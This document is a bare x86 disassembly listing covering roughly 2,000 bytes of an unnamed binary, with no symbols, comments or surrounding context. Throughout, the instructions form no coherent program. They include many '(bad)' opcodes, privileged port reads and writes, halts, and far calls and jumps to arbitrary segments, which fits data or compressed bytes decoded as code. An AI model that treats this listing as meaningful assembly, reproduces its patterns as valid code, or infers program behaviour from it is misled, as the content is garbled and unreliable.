  413ea5:	add    BYTE PTR [ecx-0x20],ch
  413ea8:	fiadd  DWORD PTR ds:0x1db7b3f2
  413eae:	retf   0x20c0
  413eb1:	adc    eax,0x11ca13
  413eb6:	mov    ebp,0xf7b05dac
  413ebb:	sub    eax,0x951ca95a
  413ec0:	pop    ecx
  413ec1:	inc    edx
  413ec2:	sbb    BYTE PTR [edi],bl
  413ec4:	fnstcw WORD PTR [esi-0x3f]
  413ec7:	xor    esi,esp
  413ec9:	adc    al,0x52
  413ecb:	xor    dh,BYTE PTR [ecx+0x41]
  413ece:	xchg   edi,eax
  413ecf:	rcr    esi,cl
  413ed1:	es loopne 0x413e8a
  413ed4:	ins    DWORD PTR es:[edi],dx
  413ed5:	(bad)  [edi-0x27]
  413ed8:	mov    ds:0x4ec25042,al
  413edd:	fnsave [ebp-0x4f]
  413ee0:	jae    0x413f42
  413ee2:	sbb    dh,BYTE PTR [esi]
  413ee4:	sar    DWORD PTR [ebp+0xb53c233],0x67
  413eeb:	jecxz  0x413f4d
  413eed:	jnp    0x413e8c
  413eef:	popa   
  413ef0:	inc    eax
  413ef1:	pop    es
  413ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ef3:	gs (bad) 
  413ef5:	fdivr  DWORD PTR [ebp+0x4ae73bf1]
  413efb:	xchg   ebx,eax
  413efc:	xor    al,BYTE PTR [esi+0x4]
  413eff:	jge    0x413f18
  413f01:	sbb    ch,BYTE PTR [ebp+ebp*4+0x624ff9a6]
  413f08:	xchg   edi,eax
  413f09:	fmul   QWORD PTR [ecx-0x30]
  413f0c:	sbb    DWORD PTR [eax-0x64d7eec7],edi
  413f12:	add    BYTE PTR [ebx+edx*1+0x49d0023a],bl
  413f19:	xchg   ebx,eax
  413f1a:	push   ecx
  413f1b:	push   eax
  413f1c:	xor    BYTE PTR [esi],ch
  413f1e:	pop    edi
  413f1f:	mov    eax,0xdd2a1000
  413f24:	pop    ss
  413f25:	sub    DWORD PTR [esi+0x37],ebx
  413f28:	dec    esp
  413f29:	lock in al,0xe3
  413f2c:	int3   
  413f2d:	jae    0x413ebf
  413f2f:	mov    bh,0xea
  413f31:	ret    0xde0c
  413f34:	dec    ebp
  413f35:	sub    BYTE PTR [esi+0x1766f8e6],0x23
  413f3c:	in     al,dx
  413f3d:	sbb    DWORD PTR [ecx-0x764130e0],0xffffff8b
  413f44:	mov    ds:0x1dbfa264,al
  413f49:	fsubr  QWORD PTR [edx+0x24]
  413f4c:	adc    DWORD PTR [eax],eax
  413f4e:	pop    es
  413f4f:	fild   DWORD PTR [eax]
  413f51:	adc    ecx,DWORD PTR gs:[eax+0xb]
  413f55:	fs inc edi
  413f57:	dec    ecx
  413f58:	push   ss
  413f59:	nop
  413f5a:	mov    bl,0x14
  413f5c:	es mov al,0xe2
  413f5f:	int3   
  413f60:	cmp    eax,0x5c8aa14b
  413f65:	push   edx
  413f66:	rcl    DWORD PTR [esi+0x75],0x13
  413f6a:	cmp    eax,0xb5e84e0c
  413f6f:	xchg   ecx,eax
  413f70:	mov    edi,0x43adfd0c
  413f75:	loope  0x413fad
  413f77:	int3   
  413f78:	xchg   ebp,eax
  413f79:	mov    esp,0xf510f608
  413f7e:	mov    al,fs:0x30ea71a8
  413f84:	cmc    
  413f85:	add    edi,DWORD PTR [esi-0x26]
  413f88:	adc    BYTE PTR [edi+0x50b5f5e9],0xcb
  413f8f:	into   
  413f90:	jb     0x413ff7
  413f92:	sub    al,0x28
  413f94:	(bad)  
  413f95:	jno    0x413f80
  413f97:	add    cl,BYTE PTR [eax+0x69d6a45b]
  413f9d:	outs   dx,DWORD PTR ds:[esi]
  413f9e:	add    ebp,DWORD PTR [esi]
  413fa0:	inc    esi
  413fa1:	xor    eax,0xd6591871
  413fa6:	add    eax,0xde6e4689
  413fab:	enter  0xf5c4,0xe5
  413faf:	adc    bl,BYTE PTR [esi-0x54]
  413fb2:	mov    eax,0x279d9732
  413fb7:	std    
  413fb8:	mul    esi
  413fba:	scas   al,BYTE PTR es:[edi]
  413fbb:	and    edx,DWORD PTR [ecx]
  413fbd:	lock ss or edx,eax
  413fc1:	sbb    eax,0x7fc43a93
  413fc6:	call   0xbb70:0x3f1f37f7
  413fcd:	stos   BYTE PTR es:[edi],al
  413fce:	test   BYTE PTR [ecx],cl
  413fd0:	sub    BYTE PTR [edi+edx*8],al
  413fd3:	sbb    al,0x3a
  413fd5:	pushf  
  413fd6:	mov    DWORD PTR [eax+0x40],esp
  413fd9:	add    edx,DWORD PTR [edx+0x4c]
  413fdc:	out    dx,eax
  413fdd:	in     eax,0x4d
  413fdf:	xor    bl,ch
  413fe1:	or     dl,bh
  413fe3:	pop    edi
  413fe4:	out    0x32,al
  413fe6:	dec    esp
  413fe7:	inc    esi
  413fe8:	sahf   
  413fe9:	lods   eax,DWORD PTR ds:[esi]
  413fea:	cmp    al,0x56
  413fec:	inc    edx
  413fed:	cdq    
  413fee:	jb     0x413f93
  413ff0:	inc    eax
  413ff1:	aam    0xf7
  413ff3:	jp     0x413fac
  413ff5:	dec    ebx
  413ff6:	sub    al,0x22
  413ff8:	stos   DWORD PTR es:[edi],eax
  413ff9:	push   eax
  413ffa:	fcom   st(7)
  413ffc:	cmp    eax,0x426bd6bc
  414001:	push   ds
  414002:	mov    bh,0x85
  414004:	xor    al,0xed
  414006:	cmp    al,0x65
  414008:	pop    eax
  414009:	jae    0x41402b
  41400b:	mov    ds:0x26a0579c,ax
  414011:	stos   BYTE PTR es:[edi],al
  414012:	loopne 0x41404a
  414014:	xchg   ebp,eax
  414015:	or     eax,0xab4fb945
  41401a:	and    al,0xf7
  41401c:	dec    esi
  41401d:	mov    bh,0xa7
  41401f:	sbb    al,0xec
  414021:	mov    ch,0x6c
  414023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414025:	xor    eax,0x57619d04
  41402a:	ds and BYTE PTR ss:[ebx+0x30a92d33],0x28
  414033:	int3   
  414034:	stc    
  414035:	cdq    
  414036:	or     eax,0x376d95b4
  41403b:	stc    
  41403c:	scas   al,BYTE PTR es:[edi]
  41403d:	scas   al,BYTE PTR es:[edi]
  41403e:	aad    0xcc
  414040:	push   edi
  414041:	test   al,0x0
  414043:	mov    esi,0x5258c01
  414048:	dec    ebx
  414049:	mov    WORD PTR [ebx-0x73],ss
  41404c:	pop    ss
  41404d:	push   esi
  41404e:	(bad)  
  414051:	lods   al,BYTE PTR ds:[esi]
  414052:	aaa    
  414053:	mov    ss,WORD PTR [esi-0x5e]
  414056:	push   ebx
  414057:	cdq    
  414058:	loopne 0x414057
  41405a:	ins    BYTE PTR es:[edi],dx
  41405b:	jo     0x414017
  41405d:	jp     0x4140a9
  41405f:	adc    bh,BYTE PTR [eax+ebx*2+0x45771166]
  414066:	neg    BYTE PTR [edi-0x21de1449]
  41406c:	(bad)  
  41406d:	dec    esp
  41406e:	jge    0x41401e
  414070:	retf   
  414071:	sbb    DWORD PTR [ebp+0x6860a3cf],0x18
  414078:	pop    ds
  414079:	inc    esi
  41407a:	dec    esi
  41407b:	mov    bl,BYTE PTR [ebp+0x31]
  41407e:	mov    ch,0xd4
  414080:	jg     0x4140a9
  414082:	fs test al,0xf1
  414085:	fstp   QWORD PTR [ebp+0x60]
  414088:	jmp    0xb6684b1a
  41408d:	mov    ds:0xfa3fd910,al
  414092:	out    0xe7,eax
  414094:	pop    esp
  414095:	dec    edx
  414096:	shl    eax,0x5
  414099:	and    eax,0x6602feb3
  41409e:	push   ebp
  41409f:	mov    al,0xc5
  4140a1:	adc    bl,ah
  4140a3:	jmp    0xb81f:0x16ed44a8
  4140aa:	cmp    cl,BYTE PTR [ebx-0x29]
  4140ad:	and    DWORD PTR [esi+0x11993639],0xffffff82
  4140b4:	dec    eax
  4140b5:	lahf   
  4140b6:	sbb    eax,0xc4a584ea
  4140bb:	hlt    
  4140bc:	addr16 push es
  4140be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140bf:	call   0xe4a187e9
  4140c4:	add    DWORD PTR [esi],0xffffffa4
  4140c7:	xlat   BYTE PTR ds:[ebx]
  4140c8:	int    0x90
  4140ca:	pop    edx
  4140cb:	push   0xd
  4140cd:	push   esi
  4140cf:	loopne 0x41408d
  4140d1:	retf   
  4140d2:	xchg   DWORD PTR [ebx+esi*8+0x25],eax
  4140d6:	jecxz  0x414080
  4140d8:	(bad)  
  4140d9:	xlat   BYTE PTR ds:[ebx]
  4140da:	fsub   st,st(6)
  4140dc:	jno    0x4140b0
  4140de:	inc    esi
  4140df:	mov    esp,0x8a1cccff
  4140e4:	mov    ah,0xc6
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	inc    eax
  4140e8:	inc    ebp
  4140e9:	dec    edi
  4140ea:	sbb    al,ah
  4140ec:	lods   al,BYTE PTR ds:[esi]
  4140ed:	and    eax,edx
  4140ef:	dec    esi
  4140f0:	icebp  
  4140f1:	adc    eax,0x21ed69d4
  4140f6:	and    al,0x91
  4140f8:	dec    ebx
  4140f9:	dec    ebp
  4140fa:	push   ecx
  4140fb:	add    cl,BYTE PTR [eax+eax*8]
  4140fe:	cmp    eax,0xc24af2aa
  414103:	fcmove st,st(1)
  414105:	cdq    
  414106:	push   edi
  414107:	mov    ds:0xf815dda3,eax
  41410c:	xchg   BYTE PTR [ecx-0x14],ch
  41410f:	enter  0x9abe,0xaf
  414113:	hlt    
  414114:	cmp    al,0xac
  414116:	pusha  
  414117:	jae    0x41418c
  414119:	sbb    eax,DWORD PTR [ecx]
  41411b:	dec    ebp
  41411c:	sub    DWORD PTR [esp+edx*4+0x68ae5747],esp
  414123:	adc    ebx,DWORD PTR [eax+0x403aa291]
  414129:	stc    
  41412a:	inc    esi
  41412b:	xchg   esi,eax
  41412c:	mov    ah,BYTE PTR [ecx-0x11]
  41412f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414130:	inc    esp
  414131:	mov    ds:0xc0a93a88,eax
  414136:	lods   eax,DWORD PTR ds:[esi]
  414137:	sbb    al,0x92
  414139:	in     al,dx
  41413a:	jle    0x41413c
  41413c:	into   
  41413d:	in     al,0xaf
  41413f:	xchg   ebp,eax
  414140:	es push esp
  414142:	jmp    0x4141a9
  414144:	rcr    DWORD PTR [esi-0x33ad0bf6],cl
  41414a:	add    BYTE PTR [ebx+0x52ae9a9b],bl
  414150:	push   ebx
  414151:	hlt    
  414152:	or     ah,cl
  414154:	or     al,0xa9
  414156:	jo     0x4140f5
  414158:	mov    ebx,0x1fa108ab
  41415d:	cmc    
  41415e:	dec    esp
  41415f:	das    
  414160:	add    DWORD PTR gs:[esp+edi*4],ebp
  414164:	xchg   esp,eax
  414165:	cmp    al,0x40
  414167:	sub    esp,0xb505dddc
  41416d:	mov    WORD PTR [esi],gs
  41416f:	hlt    
  414170:	add    eax,0x84919559
  414175:	ret    
  414176:	sbb    eax,0xec3d5207
  41417b:	dec    esi
  41417c:	jbe    0x41413c
  41417e:	mov    esi,0xb830d991
  414183:	ret    
  414184:	push   ds
  414185:	jecxz  0x41412b
  414187:	cwde   
  414188:	ret    
  414189:	imul   eax,DWORD PTR [ebp+0x55],0xffffffea
  41418d:	jl     0x41414d
  41418f:	cmc    
  414190:	loopne 0x41414d
  414192:	(bad)  
  414193:	and    esp,edi
  414195:	mov    al,ds:0xa5e3d3d1
  41419a:	cmp    bl,BYTE PTR [edx-0x75fe45fd]
  4141a0:	loope  0x414122
  4141a2:	into   
  4141a3:	lods   eax,DWORD PTR ds:[esi]
  4141a4:	xchg   edi,eax
  4141a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141a6:	push   ss
  4141a7:	aad    0x4e
  4141a9:	push   0x10
  4141ab:	stc    
  4141ac:	ins    BYTE PTR es:[edi],dx
  4141ad:	call   0x469d:0x22fb5026
  4141b4:	(bad)  
  4141b5:	ins    DWORD PTR es:[edi],dx
  4141b6:	cmp    ebx,DWORD PTR [edi+0x66]
  4141b9:	aam    0x9
  4141bb:	push   ebx
  4141bc:	int3   
  4141bd:	sbb    eax,0x48ee741a
  4141c2:	cwde   
  4141c3:	test   BYTE PTR [edi],ah
  4141c5:	push   ss
  4141c6:	sub    cl,dh
  4141c8:	call   0x3c3b:0x4ac126d5
  4141cf:	sbb    ecx,edi
  4141d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141d2:	in     al,dx
  4141d3:	sbb    BYTE PTR [edx],cl
  4141d5:	or     dl,BYTE PTR [esp+esi*8-0x281a8f3]
  4141dc:	and    al,BYTE PTR [ecx-0x3f8f3ed3]
  4141e2:	shl    DWORD PTR gs:[edi-0xbbf2552],cl
  4141e9:	shr    DWORD PTR [edx+0x1f],1
  4141ec:	mov    BYTE PTR [ecx+edi*1-0x76],al
  4141f0:	mul    DWORD PTR [ebp+0x350711eb]
  4141f6:	js     0x414222
  4141f8:	jne    0x41421f
  4141fa:	and    DWORD PTR [ebx],ecx
  4141fc:	mov    eax,ds:0x6de6faf8
  414201:	enter  0x146,0x3
  414205:	jge    0x414237
  414207:	add    DWORD PTR [ebp+0x25],esp
  41420a:	scas   al,BYTE PTR es:[edi]
  41420b:	xchg   edx,eax
  41420c:	lods   al,BYTE PTR ds:[esi]
  41420d:	xor    edi,DWORD PTR [eax-0x56]
  414210:	ds ror ah,0x78
  414214:	mov    cl,0x8f
  414216:	(bad)  [edi+0x4c7e96f7]
  41421c:	lds    edi,FWORD PTR [edx+0x1d]
  41421f:	xor    DWORD PTR [edx+edi*2+0x2a],edx
  414223:	(bad)  
  414224:	sar    DWORD PTR [esi-0x6f8a8b13],cl
  41422a:	ds out dx,al
  41422c:	ins    BYTE PTR es:[edi],dx
  41422d:	fdivr  QWORD PTR [ebx-0x3b111179]
  414233:	push   edx
  414234:	lock in al,0xe4
  414237:	(bad)  
  414238:	jbe    0x41426b
  41423a:	in     eax,0x64
  41423c:	int3   
  41423d:	add    BYTE PTR [edi+0xb94639d],bh
  414243:	in     eax,dx
  414244:	aam    0xe0
  414246:	in     al,0xbf
  414248:	mov    eax,0xe401ff64
  41424d:	xor    ah,bl
  41424f:	mov    bl,0x47
  414251:	data16 fcomp QWORD PTR [edx-0x1f071b2f]
  414258:	sub    eax,0x4cd68025
  41425d:	mov    edx,0xc1675f7c
  414262:	std    
  414263:	fwait
  414264:	in     al,dx
  414265:	test   DWORD PTR [ebx],ebx
  414267:	mov    ebp,0x18937e87
  41426c:	mov    ?,WORD PTR [edx+edi*2+0x1a0ed0cf]
  414273:	xlat   BYTE PTR ds:[ebx]
  414274:	iret   
  414275:	push   ebp
  414276:	inc    ecx
  414277:	push   esp
  414278:	mov    ebp,0xdf4c3bbc
  41427d:	pusha  
  41427e:	(bad)  
  41427f:	dec    ecx
  414280:	pop    ds
  414281:	out    dx,al
  414282:	or     al,0x2e
  414284:	inc    esi
  414285:	mov    esp,es
  414287:	add    eax,0xc15b0e10
  41428c:	and    al,0x56
  41428e:	sbb    eax,eax
  414290:	sub    dl,0x31
  414293:	sub    eax,edx
  414295:	out    0x30,eax
  414297:	dec    eax
  414298:	test   eax,0x66ef1fd7
  41429d:	shr    dl,cl
  41429f:	cmc    
  4142a0:	inc    eax
  4142a1:	and    DWORD PTR [esi-0x71],ecx
  4142a4:	xchg   ebp,eax
  4142a5:	mov    esi,0x8ee24f52
  4142aa:	or     DWORD PTR [edi+0x52],0x9cfda655
  4142b1:	mul    DWORD PTR [ecx]
  4142b3:	(bad)  
  4142b4:	lahf   
  4142b5:	in     eax,0xad
  4142b7:	ret    0x67fa
  4142ba:	ss stc 
  4142bc:	shl    DWORD PTR [eax],cl
  4142be:	and    edi,DWORD PTR [ebp-0x1379f629]
  4142c4:	test   BYTE PTR cs:[ebx+0x18],0x3a
  4142c9:	cli    
  4142ca:	or     ebx,eax
  4142cc:	pop    edi
  4142cd:	mov    al,0x96
  4142cf:	cmp    DWORD PTR ds:0x86690265,eax
  4142d5:	jb     0x4142fb
  4142d7:	inc    eax
  4142d8:	dec    esi
  4142d9:	addr16 retf 0xd22d
  4142dd:	or     BYTE PTR [ebp-0x6ec4f91],ah
  4142e3:	xor    al,0xd9
  4142e5:	xor    al,0x7f
  4142e7:	adc    ebx,DWORD PTR [edi]
  4142e9:	call   0x6dba:0xc7264ed
  4142f0:	inc    eax
  4142f1:	adc    BYTE PTR [ecx-0x11],0x7b
  4142f5:	mov    esi,0x13f456ab
  4142fa:	call   0xd4c2:0x876c2c4d
  414301:	cmp    DWORD PTR [ebx],ebx
  414303:	sub    dl,BYTE PTR [eax]
  414305:	fld    QWORD PTR [edi]
  414307:	jl     0x41432a
  414309:	ror    BYTE PTR [ecx+0x40],1
  41430c:	aam    0x86
  41430e:	cmp    cl,BYTE PTR [ebp-0x5a]
  414311:	xchg   ecx,eax
  414312:	cwde   
  414313:	stc    
  414314:	mov    edi,DWORD PTR [eax+0x13ee7da1]
  41431a:	call   0x2c16:0xe4edf23b
  414321:	das    
  414322:	mov    ch,0xe
  414324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414325:	daa    
  414326:	and    eax,0x94dd08ea
  41432b:	fstp   TBYTE PTR [ebx]
  41432d:	sub    eax,DWORD PTR [eax+0xb5ce5]
  414333:	cdq    
  414334:	mov    dl,0xb7
  414336:	and    esp,DWORD PTR [eax+ebp*8-0x3a1aaf5d]
  41433d:	jecxz  0x4142c3
  41433f:	mov    ds:0x292cc889,eax
  414344:	xchg   ebp,eax
  414345:	and    ebp,0xabd98228
  41434b:	dec    ecx
  41434c:	out    0xc4,eax
  41434e:	and    DWORD PTR [ebp+0x0],ebp
  414351:	gs ret 
  414353:	dec    edi
  414354:	retf   0x8985
  414357:	aaa    
  414358:	mov    al,ds:0xdc693b9c
  41435d:	jle    0x414385
  41435f:	test   eax,0x56e184cb
  414364:	(bad)  
  414365:	not    edx
  414367:	js     0x41438e
  414369:	cmp    DWORD PTR [edx-0x35ab4229],0xffffff92
  414370:	fsub   DWORD PTR [ecx]
  414372:	stc    
  414373:	adc    eax,0x391964ee
  414378:	add    BYTE PTR ds:0xfb4f479f,dl
  41437e:	sub    DWORD PTR [edi-0xe6764c0],ebx
  414384:	mov    al,0x31
  414386:	dec    ebp
  414387:	fmul   QWORD PTR [ebp+0x30]
  41438a:	pop    ds
  41438b:	add    DWORD PTR [ebx-0x18],0xffffffae
  41438f:	pop    esi
  414390:	je     0x414326
  414392:	aas    
  414393:	xchg   ecx,eax
  414394:	call   0xa9b5e3db
  414399:	in     eax,dx
  41439a:	out    0x80,al
  41439c:	in     al,0x2e
  41439e:	cli    
  41439f:	inc    esi
  4143a0:	lock loop 0x4143cf
  4143a3:	repnz rol al,0xb6
  4143a7:	sub    bl,BYTE PTR [eax+0x1e4b2db2]
  4143ad:	aam    0xd9
  4143af:	sub    BYTE PTR [edx],al
  4143b1:	mov    ecx,esp
  4143b3:	xor    eax,0x82e1aaec
  4143b8:	inc    eax
  4143b9:	out    0xee,al
  4143bb:	fs jge 0x4143db
  4143be:	jb     0x414344
  4143c0:	jnp    0x4143f3
  4143c2:	test   DWORD PTR [ecx],esp
  4143c4:	dec    ebx
  4143c5:	in     al,dx
  4143c6:	mov    cl,0x75
  4143c8:	bound  eax,QWORD PTR [ebx+0x7c]
  4143cb:	jne    0x4143c0
  4143cd:	xchg   esp,eax
  4143ce:	scas   eax,DWORD PTR es:[edi]
  4143cf:	repnz loopne 0x41443f
  4143d2:	mov    ds:0x762e1229,al
  4143d7:	bndstx [ebx],bnd1
  4143da:	jno    0x41440b
  4143dc:	sbb    ebx,DWORD PTR [eax-0x26]
  4143df:	add    al,0xb1
  4143e1:	int    0x91
  4143e3:	dec    esi
  4143e4:	cmp    BYTE PTR [edx+0x6c],dh
  4143e7:	xor    ebp,DWORD PTR [esi+0x47]
  4143ea:	pop    eax
  4143eb:	mov    bl,0xcd
  4143ed:	in     al,0x62
  4143ef:	mov    al,0xec
  4143f1:	jl     0x4143ac
  4143f3:	outs   dx,BYTE PTR ds:[esi]
  4143f4:	call   0x9291:0x7afa9522
  4143fb:	dec    ecx
  4143fc:	push   ds
  4143fd:	jg     0x414446
  4143ff:	add    BYTE PTR [edx],cl
  414401:	hlt    
  414402:	jecxz  0x4143c3
  414404:	daa    
  414405:	adc    DWORD PTR [eax+0xef289a0],esp
  41440b:	push   esp
  41440c:	(bad)  
  41440d:	out    dx,al
  41440e:	int3   
  41440f:	add    DWORD PTR [edi*2-0x393052b3],esp
  414416:	mov    ?,WORD PTR [esi+0x1c4abb51]
  41441c:	and    DWORD PTR [ebx],ecx
  41441e:	fmul   QWORD PTR ds:0x92df02ca
  414424:	call   0xe00a:0x424ff8c1
  41442b:	inc    edx
  41442c:	popf   
  41442d:	(bad)  
  41442e:	adc    cl,BYTE PTR [edx-0x3844ae77]
  414434:	xchg   ebp,eax
  414435:	popf   
  414436:	scas   al,BYTE PTR es:[edi]
  414437:	or     eax,0xa0b8c005
  41443c:	mov    bh,0xb1
  41443e:	add    cl,BYTE PTR [eax+edx*1]
  414441:	je     0x4144a6
  414443:	pushf  
  414444:	(bad)
  414448:	or     eax,0xaba959bc
  41444d:	jns    0x414449
  41444f:	sbb    al,0x4a
  414451:	inc    ecx
  414452:	and    eax,0x44357d4f
  414457:	dec    ecx
  414458:	mov    eax,ds:0x7c800410
  41445d:	wrpkru 
  414460:	and    bh,al
  414462:	lea    ebp,[eax+edx*8]
  414465:	dec    esp
  414466:	mov    al,ds:0xc78023d3
  41446b:	sub    al,0x36
  41446d:	popf   
  41446e:	in     al,0xd2
  414470:	(bad)  
  414471:	into   
  414472:	push   0xaa2d41b0
  414477:	push   cs
  414478:	fldenv [edx-0x3c]
  41447b:	jl     0x41441b
  41447d:	cmp    eax,0xb5f30b49
  414482:	lock jmp 0xb123:0x7a1423a1
  41448a:	mov    al,0x26
  41448c:	retf   
  41448d:	lock icebp 
  41448f:	jns    0x414440
  414491:	std    
  414492:	jno    0x41448f
  414494:	in     eax,0x2d
  414496:	gs and eax,0xea3fe409
  41449c:	mov    ch,0x7a
  41449e:	jno    0x414451
  4144a0:	xchg   BYTE PTR [edx],ch
  4144a2:	adc    cl,BYTE PTR [esi+0x5f3f0601]
  4144a8:	mov    bl,0xd6
  4144aa:	fld    DWORD PTR [esi-0x64]
  4144ad:	retf   
  4144ae:	sbb    al,0xe
  4144b0:	in     eax,0x8f
  4144b2:	sub    dl,BYTE PTR [esi-0x46a89292]
  4144b8:	leave  
  4144b9:	mov    esi,0x13474155
  4144be:	icebp  
  4144bf:	cs mov ah,0x85
  4144c2:	popa   
  4144c3:	jmp    0xec66:0x6b92d541
  4144ca:	stos   DWORD PTR es:[edi],eax
  4144cb:	dec    edx
  4144cc:	enter  0xdab3,0xa9
  4144d0:	rcl    BYTE PTR [edi-0x36],1
  4144d3:	mov    esi,0xa5a26d22
  4144d8:	dec    ecx
  4144d9:	push   ebx
  4144da:	add    eax,DWORD PTR [edx+0x46fa5d70]
  4144e0:	ja     0x41451f
  4144e2:	(bad)  
  4144e3:	fwait
  4144e4:	jle    0x41451e
  4144e6:	(bad)  
  4144e8:	push   ebp
  4144e9:	retf   
  4144ea:	lea    ebx,[ebp+0x6df1de3f]
  4144f0:	push   ecx
  4144f1:	lds    ecx,FWORD PTR [edi+0x3245e142]
  4144f7:	lock mov eax,0xddce3201
  4144fd:	add    eax,0xd305ecd0
  414502:	xchg   edi,eax
  414503:	mov    WORD PTR [eax-0x4a23c01f],?
  414509:	xchg   edi,eax
  41450a:	inc    ebp
  41450b:	and    BYTE PTR [ebp+eiz*8-0x38],bl
  41450f:	loopne 0x414521
  414511:	mov    edi,0xb0b7a4b1
  414516:	pop    esi
  414517:	cmp    BYTE PTR [esi+eiz*2+0x2a],bh
  41451b:	jnp    0x414592
  41451d:	xchg   ebx,eax
  41451e:	imul   eax,DWORD PTR [ebp+0x12],0xc8fc24e
  414525:	adc    al,bh
  414527:	cld    
  414528:	mov    dh,0xd4
  41452a:	push   ds
  41452b:	pushf  
  41452c:	test   DWORD PTR [ebp+0xe884e2],esp
  414532:	aad    0x92
  414534:	push   cs
  414535:	pushf  
  414536:	ins    DWORD PTR es:[edi],dx
  414537:	inc    ebx
  414538:	cli    
  414539:	dec    eax
  41453a:	hlt    
  41453b:	or     BYTE PTR ss:[eax-0x74e5d96c],ch
  414542:	cdq    
  414543:	fcom   QWORD PTR [ebp+0x7023fe72]
  414549:	out    0x6c,al
  41454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41454c:	(bad)  
  41454d:	in     al,dx
  41454e:	mov    edx,0x9c70de29
  414553:	adc    ch,BYTE PTR [ebx+ecx*4]
  414556:	sub    al,BYTE PTR cs:[ebp-0x255b37ad]
  41455d:	push   es
  41455e:	mov    ds:0x167adc01,eax
  414563:	scas   eax,DWORD PTR es:[edi]
  414564:	loopne 0x41451e
  414566:	ins    DWORD PTR es:[edi],dx
  414567:	jg     0x4145d5
  414569:	sbb    bl,0xec
  41456c:	xlat   BYTE PTR ds:[ebx]
  41456d:	inc    edi
  41456e:	data16 aad 0x27
  414571:	mov    ebp,0xe6c026da
  414576:	mov    dh,ah
  414578:	sub    dl,bl
  41457a:	imul   esi,DWORD PTR [ebx+0x35e2d198],0xffffffa4
  414581:	adc    dl,BYTE PTR [ebx-0x3755ab7b]
  414587:	xor    eax,0xf02eec5d
  41458c:	(bad)  
  41458d:	mov    ah,0x36
  41458f:	cdq    
  414590:	add    eax,0x7bcd813f
  414595:	sahf   
  414596:	jo     0x4145d6
  414598:	xchg   ebp,eax
  414599:	repz cmp ecx,esp
  41459c:	imul   esp,esp,0x4b
  41459f:	push   ebx
  4145a0:	retf   
  4145a1:	nop
  4145a2:	sbb    cl,BYTE PTR [edi+0x32e03d6]
  4145a8:	test   al,0xc7
  4145aa:	mov    WORD PTR [ebx-0x439f6864],cs
  4145b0:	mov    WORD PTR [ecx+0x114cf407],ss
  4145b6:	pop    edi
  4145b7:	aad    0x59
  4145b9:	push   ss
  4145ba:	push   0x67
  4145bc:	and    al,0xaa
  4145be:	jp     0x4145d8
  4145c0:	sahf   
  4145c1:	dec    ebx
  4145c2:	es jl  0x41455c
  4145c5:	jnp    0x414569
  4145c7:	data16 jle 0x4145bb
  4145ca:	inc    edx
  4145cb:	push   cs
  4145cc:	mov    esi,0x2423c873
  4145d1:	or     edi,eax
  4145d3:	pop    es
  4145d4:	fcmovnu st,st(2)
  4145d6:	jno    0x414635
  4145d8:	imul   ecx,DWORD PTR [ebx],0x7a
  4145db:	mov    al,ds:0x7bf45f8d
  4145e0:	das    
  4145e1:	cwde   
  4145e2:	popa   
  4145e3:	xchg   DWORD PTR [ebp-0x418ddc4a],edi
  4145e9:	sub    bl,bl
  4145eb:	push   edi
  4145ec:	sub    al,cl
  4145ee:	sub    dh,BYTE PTR [ecx+ecx*1-0x7763422]
  4145f5:	cld    
  4145f6:	xchg   esi,eax
  4145f7:	mov    ebx,0x25523e72
  4145fc:	scas   al,BYTE PTR es:[edi]
  4145fd:	sub    BYTE PTR [ebx-0x36],dh
  414600:	dec    esi
  414601:	iret   
  414602:	out    0x22,eax
  414604:	(bad)  
  414605:	cli    
  414606:	xchg   esi,eax
  414607:	pop    ds
  414608:	sti    
  414609:	lods   eax,DWORD PTR ds:[esi]
  41460a:	xchg   edi,eax
  41460b:	push   0xffffff96
  41460d:	loop   0x4145e9
  41460f:	cs or  ch,0x64
  414613:	fwait
  414614:	shr    esi,1
  414616:	add    al,0x84
  414618:	dec    ebx
  414619:	cmp    al,0xa2
  41461b:	mov    WORD PTR [ecx+0x6a],ss
  41461e:	cmp    dl,BYTE PTR gs:[eax-0x65281cad]
  414625:	add    ebp,ecx
  414627:	pusha  
  414628:	xor    esp,DWORD PTR [esi+0x5c]
  41462b:	pop    eax
  41462c:	xor    eax,0x14a79bce
  414631:	or     BYTE PTR [eax-0x36f7464b],dh
  414637:	xchg   edx,eax
  414638:	adc    eax,0x13dd7f72
  41463d:	jge    0x41462c
  41463f:	xchg   ebp,eax
  414640:	pop    esi
  414641:	ret    
  414642:	pop    ds
  414643:	test   DWORD PTR [edx-0x5d9bb225],ebx
  414649:	add    eax,ebp
  41464b:	aaa    
  41464c:	mov    esi,0x33f3080c
  414651:	aad    0x96
  414653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414654:	jecxz  0x414615
  414656:	fldenv [ecx+edi*8]
  414659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41465a:	pushf  
  41465b:	pushf  
  41465c:	jne    0x41467b
  41465e:	and    DWORD PTR [ebx+0x25d50c22],ecx
  414664:	or     cl,BYTE PTR [ebp-0x715d5f32]
  41466a:	mov    esp,0x55261ace
  41466f:	xchg   edx,eax
  414670:	mov    ecx,0x852783bb
  414675:	iret   
  414676:	sub    dl,BYTE PTR gs:[ecx]
  414679:	adc    ebp,ebx
  41467b:	repz mov ebp,ecx
  41467e:	or     eax,0x60dd1b97
  414683:	outs   dx,BYTE PTR ds:[esi]
  414684:	pop    eax
  414685:	cmp    bh,0x6b
  414688:	lea    ebx,[ebx]
  41468a:	fldenv [ebp+0x78]
  41468d:	cmp    eax,0x556dd606
  414692:	loop   0x4146b4
  414694:	dec    ebp
  414695:	mov    al,ds:0x51f55f96
  41469a:	bound  eax,QWORD PTR [eax-0x413dff9e]
  4146a0:	sub    al,0x2f
  4146a2:	mov    ds:0xee6e5298,al
  4146a7:	fst    st(7)
  4146a9:	xchg   edi,eax
  4146aa:	in     eax,dx
  4146ab:	add    al,0x76
  4146ad:	ror    BYTE PTR [esi],cl
  4146af:	and    al,0x50
